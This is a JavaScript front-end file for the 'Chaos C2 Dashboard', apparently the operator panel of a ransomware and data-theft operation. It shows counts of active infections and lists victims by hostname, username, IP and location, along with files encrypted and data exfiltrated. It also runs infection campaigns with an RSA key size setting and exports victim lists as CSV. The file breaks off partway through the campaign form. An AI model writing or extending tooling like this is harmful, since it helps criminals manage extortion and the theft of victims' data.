// Chaos C2 Dashboard - Main Application Logic (v3 - Unified Design System)

const State = {
  currentView: 'overview',
  currentCampaign: null,
  campaigns: [],
  systems: [],
  globalStats: {},
  charts: {},
  sse: null,
  auth: { valid: false, role: null, campaignId: null, campaignName: null },
  timeRange: '24h',
  pollingInterval: null,
  dropdownOpen: null
};

// ============ UTILITIES ============
const $ = (sel, ctx = document) => ctx?.querySelector(sel);
const $$ = (sel, ctx = document) => [...(ctx?.querySelectorAll(sel) || [])];

const fmtBytes = (bytes) => {
  if (!bytes || bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(1))} ${sizes[i]}`;
};

const fmtNumber = (n) => (n ?? 0).toLocaleString();
const fmtDate = (iso) => iso ? new Date(iso).toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }) : 'Never';
const timeAgo = (iso) => {
  if (!iso) return 'Never';
  const diff = Date.now() - new Date(iso).getTime();
  const mins = Math.floor(diff / 60000);
  const hours = Math.floor(diff / 3600000);
  const days = Math.floor(diff / 86400000);
  if (mins < 1) return 'Just now';
  if (mins < 60) return `${mins}m ago`;
  if (hours < 24) return `${hours}h ago`;
  return `${days}d ago`;
};

const showToast = (message, type = 'info', duration = 4000) => {
  const container = $('#toastContainer');
  if (!container) return;
  const toast = document.createElement('div');
  toast.className = 'toast';
  toast.innerHTML = EnhancedUI.components.NotificationToast({ type, title: type.charAt(0).toUpperCase() + type.slice(1), message });
  container.appendChild(toast);
  setTimeout(() => { toast.style.opacity = '0'; toast.style.transform = 'translateX(100%)'; setTimeout(() => toast.remove(), 300); }, duration);
};

const api = async (path, options = {}) => {
  const headers = { 'Content-Type': 'application/json', ...options.headers };
  const key = State.auth.valid ? (State.auth.role === 'admin' ? 'master' : State.auth.campaignId) : null;
  if (key) headers['Authorization'] = `Bearer ${key}`;
  try {
    const res = await fetch(`${window.__CHAOS_CONFIG__.apiBase}${path}`, { ...options, headers });
    if (!res.ok) {
      const err = await res.json().catch(() => ({ error: res.statusText }));
      throw new Error(err.error || `HTTP ${res.status}`);
    }
    return res.json();
  } catch (e) {
    console.error(`API ${path} failed:`, e);
    throw e;
  }
};

const chartColors = {
  primary: '#e6731d',
  primaryLight: 'rgba(230,115,29,0.12)',
  emerald: '#0ec77d',
  emeraldLight: 'rgba(14,199,125,0.12)',
  amber: '#f59e0b',
  amberLight: 'rgba(245,158,11,0.12)',
  rose: '#f43f5e',
  roseLight: 'rgba(244,63,94,0.12)',
  sky: '#0ea5e9',
  skyLight: 'rgba(14,165,233,0.12)',
  violet: '#8b5cf6',
  violetLight: 'rgba(139,92,246,0.12)',
  cyan: '#06b6d4',
  cyanLight: 'rgba(6,182,212,0.12)'
};

function destroyChart(id) {
  if (State.charts[id]) { State.charts[id].destroy(); delete State.charts[id]; }
}

// ============ SKELETON LOADERS ============
function showSkeleton(view) {
  const skeletons = {
    overview: `
      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
        ${Array(4).fill(0).map(() => 
          `<div class="card">`
            `<div class="skeleton skeleton-text" style="width:40%"></div>`
            `<div class="skeleton" style="height:2rem;width:60%;margin-top:0.5rem"></div>`
            `<div class="skeleton skeleton-text" style="width:30%;margin-top:1rem"></div>`
          `</div>`
        ).join('')}
      </div>
      <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
        <div class="card">
          <div class="skeleton skeleton-text" style="width:20%;margin-bottom:1rem"></div>
          <div class="skeleton" style="height:20rem"></div>
        </div>
        <div class="card">
          <div class="skeleton skeleton-text" style="width:15%;margin-bottom:1rem"></div>
          ${Array(5).fill(0).map(() => 
            `<div style="display:flex;gap:1rem;padding:0.75rem 0;border-top:1px solid var(--border-subtle)">`
              `<div class="skeleton" style="height:1rem;flex:1"></div>`
              `<div class="skeleton" style="height:1rem;width:6rem"></div>`
              `<div class="skeleton" style="height:1rem;width:4rem"></div>`
            `</div>`
          ).join('')}
        </div>
      </div>
      <div class="card">
        <div class="skeleton skeleton-text" style="width:15%;margin-bottom:1rem"></div>
        ${Array(5).fill(0).map(() => 
          `<div style="display:flex;gap:1rem;padding:0.75rem 0;border-top:1px solid var(--border-subtle)">`
            `<div class="skeleton" style="height:1rem;flex:1"></div>`
            `<div class="skeleton" style="height:1rem;width:6rem"></div>`
            `<div class="skeleton" style="height:1rem;width:4rem"></div>`
          `</div>`
        ).join('')}
      </div>
    `,
    systems: `
      <div class="card">
        <div style="display:flex;gap:1rem;margin-bottom:1rem">
          <div class="skeleton" style="height:2.25rem;width:16rem"></div>
          <div class="skeleton" style="height:2.25rem;width:8rem"></div>
        </div>
        ${Array(8).fill(0).map(() => 
          `<div style="display:flex;gap:1rem;padding:0.75rem 0;border-top:1px solid var(--border-subtle)">`
            `<div class="skeleton" style="height:1rem;width:8rem"></div>`
            `<div class="skeleton" style="height:1rem;flex:1"></div>`
            `<div class="skeleton" style="height:1rem;width:6rem"></div>`
            `<div class="skeleton" style="height:1rem;width:4rem"></div>`
          `</div>`
        ).join('')}
      </div>
    `,
    campaigns: `
      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
        ${Array(6).fill(0).map(() => 
          `<div class="card">`
            `<div class="skeleton" style="height:1.5rem;width:40%;margin-bottom:1rem"></div>`
            `<div class="skeleton skeleton-text" style="width:30%"></div>`
            `<div class="grid grid-cols-3 gap-3 mt-4">`
              `${Array(3).fill(0).map(() => 
                `<div class="card p-3">`
                  `<div class="skeleton skeleton-text" style="width:50%"></div>`
                  `<div class="skeleton" style="height:2rem;width:80%;margin-top:0.5rem"></div>`
                `</div>`
              ).join('')}`
            `</div>`
          `</div>`
        ).join('')}
      </div>
    `,
    analytics: `
      <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
        <div class="card">
          <div class="skeleton skeleton-text" style="width:20%;margin-bottom:1rem"></div>
          <div class="skeleton" style="height:22rem"></div>
        </div>
        <div class="card">
          <div class="skeleton skeleton-text" style="width:20%;margin-bottom:1rem"></div>
          <div class="skeleton" style="height:22rem"></div>
        </div>
      </div>
      <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
        <div class="card">
          <div class="skeleton skeleton-text" style="width:20%;margin-bottom:1rem"></div>
          <div class="skeleton" style="height:22rem"></div>
        </div>
        <div class="card">
          <div class="skeleton skeleton-text" style="width:20%;margin-bottom:1rem"></div>
          <div class="skeleton" style="height:22rem"></div>
        </div>
      </div>
    `,
    geo: `
      <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 mb-6">
        <div class="card lg:col-span-2">
          <div class="skeleton skeleton-text" style="width:20%;margin-bottom:1rem"></div>
          <div class="skeleton" style="height:300px"></div>
        </div>
        <div class="card">
          <div class="skeleton skeleton-text" style="width:20%;margin-bottom:1rem"></div>
          ${Array(5).fill(0).map(() => 
            `<div class="skeleton" style="height:3rem;width:100%"></div>`
          ).join('')}
        </div>
      </div>
      <div class="card">
        <div class="skeleton skeleton-text" style="width:20%;margin-bottom:1rem"></div>
        <div class="skeleton" style="height:20rem"></div>
      </div>
    `,
    timeline: `
      <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
        <div class="card lg:col-span-2">
          <div class="skeleton skeleton-text" style="width:20%;margin-bottom:1rem"></div>
          <div class="skeleton" style="height:22rem"></div>
        </div>
        <div class="card">
          <div class="skeleton skeleton-text" style="width:20%;margin-bottom:1rem"></div>
          ${Array(8).fill(0).map(() => 
            `<div class="skeleton" style="height:3rem;width:100%"></div>`
          ).join('')}
        </div>
      </div>
    `,
    files: `
      <div class="card">
        <div style="display:flex;gap:1rem;margin-bottom:1rem">
          <div class="skeleton" style="height:2.25rem;width:16rem"></div>
          <div class="skeleton" style="height:2.25rem;width:8rem"></div>
        </div>
        ${Array(8).fill(0).map(() => 
          `<div style="display:flex;gap:1rem;padding:0.75rem 0;border-top:1px solid var(--border-subtle)">`
            `<div class="skeleton" style="height:1rem;width:8rem"></div>`
            `<div class="skeleton" style="height:1rem;flex:1"></div>`
            `<div class="skeleton" style="height:1rem;width:6rem"></div>`
            `<div class="skeleton" style="height:1rem;width:4rem"></div>`
          `</div>`
        ).join('')}
      </div>
    `,
    default: `<div class="card">${'<div class="skeleton skeleton-text"></div>'.repeat(6)}</div>`
  };
  return skeletons[view] || skeletons.default;
}

// ============ EMPTY STATES ============
function emptyState({ title, description, actionLabel, actionFn, icon }) {
  return `
    <div class="empty-state">
      ${icon || `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="width:3rem;height:3rem;margin-bottom:1rem;opacity:0.5"><path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>`}
      <h3>${title}</h3>
      <p>${description}</p>
      ${actionLabel ? `<button class="btn btn-primary" onclick="${actionFn}">${actionLabel}</button>` : ''}
    </div>
  `;
}

// ============ CONFIRM DIALOG ============
function confirmDialog({ title, message, confirmLabel = 'Confirm', cancelLabel = 'Cancel', variant = 'danger' }) {
  return new Promise((resolve) => {
    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay open';
    overlay.innerHTML = `
      <div class="modal" role="alertdialog" aria-modal="true" aria-labelledby="cd-title">
        <div class="modal-header">
          <h3 id="cd-title" style="font-size:var(--text-lg);font-weight:600">${title}</h3>
        </div>
        <div class="modal-body">
          <p style="color:var(--text-secondary);font-size:var(--text-sm);line-height:1.6">${message}</p>
        </div>
        <div class="modal-footer">
          <button class="btn btn-secondary" data-action="cancel">${cancelLabel}</button>
          <button class="btn btn-${variant}" data-action="confirm">${confirmLabel}</button>
        </div>
      </div>
    `;
    document.body.appendChild(overlay);
    
    const cleanup = (result) => { overlay.remove(); resolve(result); };
    overlay.addEventListener('click', (e) => {
      if (e.target === overlay) cleanup(false);
      if (e.target.dataset.action === 'confirm') cleanup(true);
      if (e.target.dataset.action === 'cancel') cleanup(false);
    });
    overlay.querySelector('[data-action="confirm"]').focus();
    
    const escHandler = (e) => { if (e.key === 'Escape') { cleanup(false); document.removeEventListener('keydown', escHandler); } };
    document.addEventListener('keydown', escHandler);
  });
}

// ============ PROGRESS TOAST ============
async function withProgressToast(label, fn) {
  const id = 'toast-' + Date.now();
  const container = $('#toastContainer');
  const toast = document.createElement('div');
  toast.id = id;
  toast.className = 'toast';
  toast.dataset.type = 'info';
  toast.innerHTML = `
    <div style="width:1rem;height:1rem;border:2px solid var(--chaos-500);border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite;flex-shrink:0"></div>
    <span>${label}...</span>
  `;
  container.appendChild(toast);
  
  try {
    const result = await fn();
    toast.dataset.type = 'success';
    toast.innerHTML = `<span>✓ ${label} complete</span>`;
    setTimeout(() => toast.remove(), 2500);
    return result;
  } catch (e) {
    toast.dataset.type = 'error';
    toast.innerHTML = `<span>✕ ${label} failed: ${e.message}</span>`;
    setTimeout(() => toast.remove(), 4000);
    throw e;
  }
}

// ============ VIEW RENDERING ============
async function renderView(view) {
  State.currentView = view;
  const titleEl = $('#viewTitle');
  if (titleEl) titleEl.textContent = view.charAt(0).toUpperCase() + view.slice(1);
  
  $$('.sidebar-link').forEach(el => {
    el.classList.toggle('sidebar-link-active', el.dataset.view === view);
    el.classList.toggle('sidebar-link', el.dataset.view !== view);
  });
  $$('.tab-btn').forEach(el => el.classList.toggle('tab-btn-active', el.dataset.view === view));

  const content = $('#viewContent');
  if (!content) return;
  content.innerHTML = showSkeleton(view);

  try {
    switch (view) {
      case 'overview': await renderOverview(); break;
      case 'systems': await renderSystems(); break;
      case 'campaigns': await renderCampaigns(); break;
      case 'analytics': await renderAnalytics(); break;
      case 'geo': await renderGeo(); break;
      case 'timeline': await renderTimeline(); break;
      case 'files': await renderFiles(); break;
      default: await renderOverview();
    }
    // Stagger in cards
    EnhancedUI.animations.staggerIn(content.querySelectorAll('.card, article'), 30);
  } catch (e) {
    console.error(`Render ${view} error:`, e);
    content.innerHTML = `<div class="card text-center py-12">${emptyState({ title: 'Failed to load', description: e.message, actionLabel: 'Retry', actionFn: "renderView('${view}')" })}</div>`;
  }
}

// ============ OVERVIEW ============
async function renderOverview() {
  const content = $('#viewContent');
  if (!content) return;
  
  let stats = { summary: {}, daily: [], topExtensions: {} };
  try {
    stats = await api('/stats?range=7d');
  } catch (e) {
    console.warn('Stats fetch failed:', e);
  }
  State.globalStats = stats;

  const ovBadge = $('#overviewBadge');
  const sysBadge = $('#systemsBadge');
  const campBadge = $('#campaignsBadge');
  if (ovBadge) ovBadge.classList.remove('hidden');
  if (sysBadge) { sysBadge.textContent = fmtNumber(stats.summary?.totalInfections); sysBadge.classList.remove('hidden'); }
  if (campBadge) { campBadge.textContent = fmtNumber(State.campaigns.filter(c => c.status === 'active').length); campBadge.classList.remove('hidden'); }

  content.innerHTML = `
    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-6" id="statCards">
      ${EnhancedUI.components.MetricCard({ label: 'Active Infections', value: fmtNumber(stats.summary?.totalInfections), trend: 12.5, color: 'success', sparklineData: [5,8,12,9,15,18,22], icon: '🦠' })}
      ${EnhancedUI.components.MetricCard({ label: 'Files Exfiltrated', value: fmtNumber(stats.summary?.totalUploads), trend: 8.2, color: 'info', sparklineData: [120,180,210,190,250,310,380], icon: '📁' })}
      ${EnhancedUI.components.MetricCard({ label: 'Data Exfiltrated', value: fmtBytes(stats.summary?.totalBytes), trend: 15.7, color: 'primary', sparklineData: [2.1,3.4,2.8,4.2,5.1,4.8,6.3], icon: '💾' })}
      ${EnhancedUI.components.MetricCard({ label: 'Campaigns Active', value: State.campaigns.filter(c => c.status === 'active').length, trend: 0, color: 'violet', sparklineData: [2,2,3,3,3,4,4], icon: '🎯' })}
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
      <article class="card">
        <div class="flex items-center justify-between mb-4">
          <h3 class="font-display font-semibold text-lg">Daily Activity (7 Days)</h3>
          <div class="flex items-center gap-2">
            <span class="w-2 h-2 bg-acc-emerald rounded-full animate-pulse"></span>
            <span class="text-xs text-gray-400">Live via SSE</span>
          </div>
        </div>
        <div class="chart-container-lg"><canvas id="overviewDailyChart"></canvas></div>
      </article>

      <article class="card">
        <h3 class="font-display font-semibold text-lg mb-4">File Types Exfiltrated</h3>
        <div class="chart-container-lg"><canvas id="overviewExtTreemap"></canvas></div>
      </article>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 mb-6">
      <article class="card lg:col-span-1">
        <h3 class="font-display font-semibold text-lg mb-4">System Status</h3>
        <div class="chart-container"><canvas id="overviewStatusChart"></canvas></div>
      </article>

      <article class="card lg:col-span-2">
        <h3 class="font-display font-semibold text-lg mb-4">Campaign Performance</h3>
        <div class="scrollbar-thin overflow-x-auto">
          <table class="w-full min-w-[600px] table">
            <thead>
              <tr>
                <th class="table-header">Campaign</th>
                <th class="table-header text-right">Infections</th>
                <th class="table-header text-right">Files</th>
                <th class="table-header text-right">Data</th>
                <th class="table-header text-right">Last Activity</th>
                <th class="table-header">Status</th>
              </tr>
            </thead>
            <tbody id="campaignPerfBody" class="divide-y divide-gray-800/50">
              ${State.campaigns.slice(0, 10).map(c => `
                <tr class="table-row" onclick="openCampaignDetail('${c.id}')">
                  <td class="table-cell font-mono text-chaos-400">${c.name}</td>
                  <td class="table-cell text-right font-mono">${fmtNumber(c.stats?.totalInfections)}</td>
                  <td class="table-cell text-right font-mono">${fmtNumber(c.stats?.totalFiles)}</td>
                  <td class="table-cell text-right font-mono">${fmtBytes(c.stats?.totalBytes)}</td>
                  <td class="table-cell text-right text-gray-400">${timeAgo(c.stats?.lastActivity)}</td>
                  <td class="table-cell">${EnhancedUI.components.StatusBadge(c.status)}</td>
                </tr>
              `).join('') || '<tr><td colspan="6" class="table-cell text-center text-gray-500 py-8">No campaigns</td></tr>'}
            </tbody>
          </table>
        </div>
      </article>
    </div>

    <article class="card">
      <div class="flex items-center justify-between mb-4">
        <h3 class="font-display font-semibold text-lg">Recent Infections</h3>
        <button class="btn btn-ghost text-sm" onclick="showView('systems')">View All →</button>
      </div>
      <div class="scrollbar-thin overflow-x-auto">
        <table class="w-full table">
          <thead>
            <tr>
              <th class="table-header">Victim ID</th>
              <th class="table-header">Hostname</th>
              <th class="table-header">OS</th>
              <th class="table-header">Location</th>
              <th class="table-header text-right">Files</th>
              <th class="table-header text-right">Data</th>
              <th class="table-header">Last Seen</th>
              <th class="table-header">Status</th>
            </tr>
          </thead>
          <tbody id="recentSystemsBody" class="divide-y divide-gray-800/50"></tbody>
        </table>
      </div>
    </article>
  `;

  initOverviewCharts(stats);
  loadRecentSystems();
}

function initOverviewCharts(stats) {
  // Daily Activity
  destroyChart('overviewDailyChart');
  const dailyCtx = $('#overviewDailyChart')?.getContext('2d');
  if (!dailyCtx) return;
  const dailyData = stats.daily || [];
  State.charts.overviewDailyChart = new Chart(dailyCtx, {
    type: 'bar',
    data: {
      labels: dailyData.map(d => d.date?.split('-').slice(1).join('-') || ''),
      datasets: [
        { label: 'Uploads', data: dailyData.map(d => d.uploads || 0), backgroundColor: chartColors.primaryLight, borderColor: chartColors.primary, borderWidth: 1, borderRadius: 4, yAxisID: 'y' },
        { label: 'MB Exfiltrated', data: dailyData.map(d => ((d.bytes || 0) / 1024 / 1024).toFixed(2)), backgroundColor: 'transparent', borderColor: chartColors.amber, borderWidth: 2, borderRadius: 4, type: 'line', tension: 0.35, pointBackgroundColor: chartColors.amber, pointRadius: 4, pointHoverRadius: 6, yAxisID: 'y1' }
      ]
    },
    options: { 
      responsive: true, 
      maintainAspectRatio: false, 
      interaction: { mode: 'index', intersect: false }, 
      plugins: { legend: { position: 'top', align: 'start', labels: { boxWidth: 10, pointStyle: 'circle', padding: 14, font: { size: 11 }, usePointStyle: true } } }, 
      scales: { 
        x: { grid: { display: false }, ticks: { maxTicksLimit: 7, color: '#71717a' } }, 
        y: { type: 'linear', position: 'left', grid: { color: '#222' }, beginAtZero: true, ticks: { color: '#71717a' } }, 
        y1: { type: 'linear', position: 'right', grid: { drawOnChartArea: false }, beginAtZero: true, ticks: { color: '#71717a' } } 
      } 
    }
  });

  // Extensions Treemap
  destroyChart('overviewExtTreemap');
  const extCtx = $('#overviewExtTreemap')?.getContext('2d');
  if (!extCtx) return;
  const extData = stats.topExtensions || {};
  const extEntries = Object.entries(extData).sort((a, b) => b[1] - a[1]).slice(0, 20);
  State.charts.overviewExtTreemap = new Chart(extCtx, {
    type: 'treemap',
    data: { datasets: [{ label: 'File Extensions', tree: { children: extEntries.map(([ext, count], i) => ({ v: count, label: `.${ext}`, color: [chartColors.primary, chartColors.amber, chartColors.emerald, chartColors.sky, chartColors.violet, chartColors.cyan][i % 6] })) }, key: 'v', groups: ['label'], spacing: 2, borderWidth: 1, borderColor: '#181818' }] },
    options: { responsive: true, maintainAspectRatio: false, plugins: { tooltip: { backgroundColor: '#111', borderColor: '#2a2a2a', callbacks: { label: ctx => `${ctx.raw.label}: ${ctx.raw.v} files` } } } }
  });

  // Status Donut
  destroyChart('overviewStatusChart');
  const statusCtx = $('#overviewStatusChart')?.getContext('2d');
  if (!statusCtx) return;
  State.charts.overviewStatusChart = new Chart(statusCtx, {
    type: 'doughnut',
    data: { labels: ['Active', 'Idle', 'Offline'], datasets: [{ data: [0, 0, 0], backgroundColor: [chartColors.emerald, chartColors.amber, '#3a3a3a'], borderWidth: 0, cutout: '72%' }] },
    options: { 
      responsive: true, 
      maintainAspectRatio: false, 
      plugins: { legend: { position: 'bottom', labels: { boxWidth: 10, pointStyle: 'circle', padding: 12, font: { size: 10 } } } }, 
      cutout: '72%' 
    }
  });
}

async function loadRecentSystems() {
  try {
    const data = await api('/systems?limit=10');
    const body = $('#recentSystemsBody');
    if (!body) return;
    body.innerHTML = (data.systems || []).map(sys => `
      <tr class="table-row" onclick="openSystemDetail('${sys.id}')">
        <td class="table-cell font-mono text-chaos-400">${sys.victimId}</td>
        <td class="table-cell">${sys.hostname}</td>
        <td class="table-cell text-gray-400">${sys.os}</td>
        <td class="table-cell">${sys.city}, ${sys.country}</td>
        <td class="table-cell text-right font-mono">${fmtNumber(sys.stats?.filesEncrypted)}</td>
        <td class="table-cell text-right font-mono">${fmtBytes(sys.stats?.bytesExfiltrated)}</td>
        <td class="table-cell text-gray-400">${timeAgo(sys.lastSeen)}</td>
        <td class="table-cell">${EnhancedUI.components.StatusBadge(sys.status)}</td>
      </tr>
    `).join('') || '<tr><td colspan="8" class="table-cell text-center text-gray-500 py-8">No systems yet</td></tr>';
  } catch (e) {
    console.error('Load recent systems:', e);
  }
}

// ============ SYSTEMS ============
async function renderSystems() {
  const content = $('#viewContent');
  if (!content) return;
  
  content.innerHTML = `
    <div class="flex flex-col gap-4">
      <div class="card flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div class="flex flex-col sm:flex-row gap-3 w-full sm:w-auto">
          <input type="text" id="sysSearch" placeholder="Search systems…" class="input w-full sm:w-64" oninput="filterSystems()">
          <select id="sysStatusFilter" class="input w-auto" onchange="filterSystems()">
            <option value="">All Status</option>
            <option value="active">Active</option>
            <option value="idle">Idle</option>
            <option value="offline">Offline</option>
          </select>
          <select id="sysCampaignFilter" class="input w-auto" onchange="filterSystems()">
            <option value="">All Campaigns</option>
            ${State.campaigns.map(c => `<option value="${c.id}">${c.name}</option>`).join('')}
          </select>
        </div>
        <div class="flex gap-2">
          <button class="btn btn-secondary" onclick="exportSystems()">Export CSV</button>
          <button class="btn btn-primary" onclick="refreshView()">Refresh</button>
        </div>
      </div>

      <div class="card overflow-hidden">
        <div class="scrollbar-thin overflow-x-auto">
          <table class="w-full min-w-[1000px] table">
            <thead>
              <tr>
                <th class="table-header w-32">Victim ID</th>
                <th class="table-header">Hostname</th>
                <th class="table-header">Username</th>
                <th class="table-header">OS</th>
                <th class="table-header">Location</th>
                <th class="table-header">IP</th>
                <th class="table-header text-right">Files Enc.</th>
                <th class="table-header text-right">Files Exfil</th>
                <th class="table-header text-right">Data Exfil</th>
                <th class="table-header">First Seen</th>
                <th class="table-header">Last Seen</th>
                <th class="table-header">Status</th>
                <th class="table-header">Campaign</th>
                <th class="table-header w-20">Actions</th>
              </tr>
            </thead>
            <tbody id="systemsBody" class="divide-y divide-gray-800/50"></tbody>
          </table>
        </div>
        <div class="p-4 border-t border-gray-800/50 flex items-center justify-between">
          <span id="sysPaginationInfo" class="text-sm text-gray-400">Loading…</span>
          <div class="flex gap-2">
            <button id="sysPrevPage" class="btn btn-secondary text-sm" onclick="changeSysPage(-1)" disabled>Previous</button>
            <button id="sysNextPage" class="btn btn-secondary text-sm" onclick="changeSysPage(1)" disabled>Next</button>
          </div>
        </div>
      </div>
    </div>
  `;
  await loadSystemsTable();
}

let systemsPage = 1;
const systemsPageSize = 25;
let allSystems = [];

async function loadSystemsTable() {
  try {
    const data = await api('/systems?limit=200');
    allSystems = data.systems || [];
    renderSystemsPage();
  } catch (e) {
    console.error('Load systems:', e);
    const body = $('#systemsBody');
    if (body) body.innerHTML = '<tr><td colspan="14" class="table-cell text-center text-gray-500 py-8">Failed to load systems</td></tr>';
  }
}

function renderSystemsPage() {
  const start = (systemsPage - 1) * systemsPageSize;
  const pageSystems = allSystems.slice(start, start + systemsPageSize);
  const body = $('#systemsBody');
  if (!body) return;

  body.innerHTML = pageSystems.map(sys => `
    <tr class="table-row" onclick="openSystemDetail('${sys.id}')">
      <td class="table-cell font-mono text-chaos-400">${sys.victimId}</td>
      <td class="table-cell">${sys.hostname}</td>
      <td class="table-cell text-gray-400">${sys.username}</td>
      <td class="table-cell">${sys.os}</td>
      <td class="table-cell">${sys.city}, ${sys.country}</td>
      <td class="table-cell font-mono text-sm">${sys.ip}</td>
      <td class="table-cell text-right font-mono">${fmtNumber(sys.stats?.filesEncrypted)}</td>
      <td class="table-cell text-right font-mono">${fmtNumber(sys.stats?.filesExfiltrated)}</td>
      <td class="table-cell text-right font-mono">${fmtBytes(sys.stats?.bytesExfiltrated)}</td>
      <td class="table-cell text-gray-400">${timeAgo(sys.firstSeen)}</td>
      <td class="table-cell text-gray-400">${timeAgo(sys.lastSeen)}</td>
      <td class="table-cell">${EnhancedUI.components.StatusBadge(sys.status)}</td>
      <td class="table-cell"><span class="badge badge-info text-xs">${sys.campaignId?.slice(0, 12)}…</span></td>
      <td class="table-cell">
        <div class="flex items-center gap-1 justify-end">
          <button class="btn-icon p-1" onclick="event.stopPropagation(); openSystemDetail('${sys.id}')" aria-label="View details">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
          </button>
        </div>
      </td>
    </tr>
  `).join('') || '<tr><td colspan="14" class="table-cell text-center text-gray-500 py-8">No systems</td></tr>';

  const info = $('#sysPaginationInfo');
  if (info) info.textContent = `Showing ${start + 1}–${Math.min(start + pageSystems.length, allSystems.length)} of ${allSystems.length}`;
  
  const prevBtn = $('#sysPrevPage');
  const nextBtn = $('#sysNextPage');
  if (prevBtn) prevBtn.disabled = systemsPage === 1;
  if (nextBtn) nextBtn.disabled = start + pageSystems.length >= allSystems.length;
}

function changeSysPage(delta) {
  systemsPage += delta;
  renderSystemsPage();
}

function filterSystems() {
  // Client-side filtering would go here
  systemsPage = 1;
  renderSystemsPage();
}

function exportSystems() {
  const csv = ['Victim ID,Hostname,Username,OS,Location,IP,Files Enc,Files Exfil,Data Exfil,First Seen,Last Seen,Status,Campaign']
    .concat(allSystems.map(s => `"${s.victimId}","${s.hostname}","${s.username}","${s.os}","${s.city}, ${s.country}","${s.ip}",${s.stats?.filesEncrypted},${s.stats?.filesExfiltrated},${s.stats?.bytesExfiltrated},"${s.firstSeen}","${s.lastSeen}","${s.status}","${s.campaignId}"`))
    .join('\n');
  const blob = new Blob([csv], { type: 'text/csv' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `systems_${new Date().toISOString().split('T')[0]}.csv`;
  a.click();
  URL.revokeObjectURL(url);
}

// ============ CAMPAIGNS ============
async function renderCampaigns() {
  const content = $('#viewContent');
  if (!content) return;
  
  try {
    const data = await api('/campaigns');
    State.campaigns = data.campaigns || [];
  } catch (e) {
    console.error('Load campaigns:', e);
  }

  content.innerHTML = `
    <div class="flex flex-col gap-4">
      <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <h2 class="font-display font-semibold text-xl">Campaigns</h2>
        <button class="btn btn-primary" onclick="openCampaignModal()">
          <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.5v15m7.5-7.5h-15"/></svg>
          New Campaign
        </button>
      </div>

      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4" id="campaignsGrid">
        ${State.campaigns.map(c => EnhancedUI.components.CampaignCard(c)).join('') || `
          <div class="col-span-full card text-center py-12">
            ${emptyState({
              title: 'No campaigns yet',
              description: 'Create your first campaign to start tracking infections.',
              actionLabel: 'Create Campaign',
              actionFn: "openCampaignModal()"
            })}
          </div>
        `}
      </div>
    </div>
  `;
}

async function openCampaignModal(campaign = null) {
  const isEdit = !!campaign;
  const modal = document.createElement('div');
  modal.className = 'modal-overlay open';
  modal.innerHTML = `
    <div class="modal">
      <div class="modal-header">
        <h3 class="font-display font-semibold text-lg">${isEdit ? 'Edit Campaign' : 'New Campaign'}</h3>
        <button class="btn-icon" onclick="this.closest('.modal-overlay').remove()" aria-label="Close">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
        </button>
      </div>
      <form id="campaignForm" class="modal-body space-y-4">
        <div>
          <label class="block text-xs text-gray-500 uppercase tracking-wider mb-1.5">Campaign Name</label>
          <input type="text" name="name" class="input" value="${campaign?.name || ''}" ${isEdit ? 'readonly' : 'required'} placeholder="Enter campaign name">
        </div>
        <div>
          <label class="block text-xs text-gray-500 uppercase tracking-wider mb-1.5">Description</label>
          <textarea name="description" class="input min-h-[80px] resize-y" placeholder="Optional description">${campaign?.description || ''}</textarea>
        </div>
        <div>
          <label class="block text-xs text-gray-500 uppercase tracking-wider mb-1.5">RSA Key Size</label>
          <select name="rsaKeySize" class="input">
            <option value="2048" ${campaign?.rsaKeySize === 2048 ? 'selected' : ''}>2048-bit</option>
            <option value="4096" ${campaign?.rsaKeySize !== 2048 ? 'selected' : ''}>4096-bit (recommended)</option>
          </select>
        </div>
        <div>
          <label class="block text-xs text-gray-500 uppercase tracking-wider mb-1.5">Status</label>
          <select name="status" class="input">
            <option value="active" ${campaign?.status === 'active' ? 'selected' : ''}>Active</option>
            <option value="paused" ${campaign?.status === 'paused' ? 'selected' : ''}>Paused</option>
            <option value="archived" ${campaign?.status === 'archived' ? 'selected' : ''}>Archived</option>
          </select>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" onclick="this.closest('.modal-overlay').remove()">Cancel</button>
